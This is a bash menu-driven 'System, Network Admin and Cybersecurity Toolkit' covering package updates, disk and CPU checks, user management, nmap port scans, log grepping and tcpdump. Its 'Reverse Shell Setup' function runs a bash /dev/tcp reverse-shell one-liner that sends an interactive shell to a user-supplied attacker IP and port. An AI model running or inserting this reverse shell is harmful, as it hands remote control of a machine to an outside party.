#!/bin/bash
# System, Network Admin and Cybersecurity Toolkit
# Author: SEA
# Version: 1.4

# Color Codes
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# Display Main Menu
main_menu() {
    clear
    echo -e "${GREEN}=== Toolkit ===${RESET}"
    echo "1) System Administration Tasks"
    echo "2) Network Administration Tasks"
    echo "3) Cybersecurity & Ethical Hacking"
    echo "4) Exit"
    echo -n "Select an option: "
    read choice

    case $choice in
        1) system_admin_menu ;;
        2) network_admin_menu ;;
        3) cybersecurity_menu ;;
        4) exit 0 ;;
        *) echo -e "${RED}Invalid choice!${RESET}"; sleep 2; main_menu ;;
    esac
}

# System Administration Menu
system_admin_menu() {
    clear
    echo -e "${YELLOW}=== System Administration Tasks ===${RESET}"
    echo "1) System Update & Cleanup"
    echo "2) Disk Space Monitoring"
    echo "3) CPU & RAM Usage Monitor"
    echo "4) User Management"
    echo "5) Back to Main Menu"
    echo -n "Choose an option: "
    read sys_choice

    case $sys_choice in
        1) system_update_cleanup ;;
        2) disk_monitor ;;
        3) cpu_ram_monitor ;;
        4) user_management ;;
        5) main_menu ;;
        *) echo -e "${RED}Invalid choice!${RESET}"; sleep 2; system_admin_menu ;;
    esac
}

# System Update & Cleanup
system_update_cleanup() {
    echo -e "${GREEN}Updating system and cleaning up...${RESET}"
    sudo apt update && sudo apt upgrade -y
    sudo apt autoremove -y && sudo apt autoclean
    echo -e "${GREEN}System updated successfully!${RESET}"
    sleep 2
    system_admin_menu
}

# Disk Space Monitoring
disk_monitor() {
    echo -e "${YELLOW}Checking disk space...${RESET}"
    df -h
    sleep 3
    system_admin_menu
}

# CPU & RAM Usage Monitor
cpu_ram_monitor() {
    echo -e "${YELLOW}Monitoring CPU & RAM usage...${RESET}"
    top -b -n 1 | head -20
    sleep 3
    system_admin_menu
}

# User Management
user_management() {
    echo -n "Enter username to add/remove: "
    read username
    echo "1) Add User"
    echo "2) Remove User"
    echo -n "Choose an option: "
    read user_choice

    if [[ $user_choice -eq 1 ]]; then
        sudo adduser $username
        echo -e "${GREEN}User $username added successfully.${RESET}"
    elif [[ $user_choice -eq 2 ]]; then
        sudo deluser $username
        echo -e "${RED}User $username removed.${RESET}"
    else
        echo -e "${RED}Invalid choice!${RESET}"
    fi
    sleep 2
    system_admin_menu
}

# Network Administration Menu
network_admin_menu() {
    clear
    echo -e "${YELLOW}=== Network Administration Tasks ===${RESET}"
    echo "1) Check Network Connectivity"
    echo "2) Scan Open Ports"
    echo "3) Monitor Bandwidth Usage"
    echo "4) Back to Main Menu"
    echo -n "Choose an option: "
    read net_choice

    case $net_choice in
        1) network_connectivity ;;
        2) scan_open_ports ;;
        3) bandwidth_monitor ;;
        4) main_menu ;;
        *) echo -e "${RED}Invalid choice!${RESET}"; sleep 2; network_admin_menu ;;
    esac
}

# Check Network Connectivity
network_connectivity() {
    echo -n "Enter host to ping: "
    read host
    ping -c 4 $host
    sleep 3
    network_admin_menu
}

# Scan Open Ports
scan_open_ports() {
    echo -n "Enter target IP: "
    read target
    sudo nmap -p- $target
    sleep 3
    network_admin_menu
}

# Monitor Bandwidth Usage
bandwidth_monitor() {
    echo -e "${YELLOW}Monitoring network bandwidth usage...${RESET}"
    ifconfig | grep "RX bytes"
    sleep 3
    network_admin_menu
}

# Cybersecurity & Ethical Hacking Menu
cybersecurity_menu() {
    clear
    echo -e "${RED}=== Cybersecurity & Ethical Hacking ===${RESET}"
    echo "1) Brute Force Detection"
    echo "2) Log Analysis for Security Breaches"
    echo "3) Packet Sniffing"
    echo "4) Reverse Shell Setup"
    echo "5) Back to Main Menu"
    echo -n "Choose an option: "
    read sec_choice

    case $sec_choice in
        1) brute_force_detection ;;
        2) log_analysis ;;
        3) packet_sniffing ;;
        4) reverse_shell ;;
        5) main_menu ;;
        *) echo -e "${RED}Invalid choice!${RESET}"; sleep 2; cybersecurity_menu ;;
    esac
}

# Brute Force Detection
brute_force_detection() {
    echo -e "${RED}Checking for brute-force attacks in SSH logs...${RESET}"
    sudo cat /var/log/auth.log | grep "Failed password" | tail -20
    sleep 3
    cybersecurity_menu
}

# Log Analysis for Security Breaches
log_analysis() {
    echo -e "${RED}Analyzing system logs for potential security threats...${RESET}"
    sudo grep -i "failed\|error\|unauthorized\|denied" /var/log/syslog | tail -20
    sleep 3
    cybersecurity_menu
}

# Packet Sniffing
packet_sniffing() {
    echo -e "${RED}Starting packet sniffing (Ctrl+C to stop)...${RESET}"
    sudo tcpdump -i eth0 -c 10
    sleep 3
    cybersecurity_menu
}

# Reverse Shell Setup
reverse_shell() {
    echo -n "Enter attacker's IP: "
    read attacker_ip
    echo -n "Enter port: "
    read attacker_port
    echo -e "${RED}Setting up reverse shell...${RESET}"
    bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1
    sleep 3
    cybersecurity_menu
}

# Run the Main Menu
main_menu

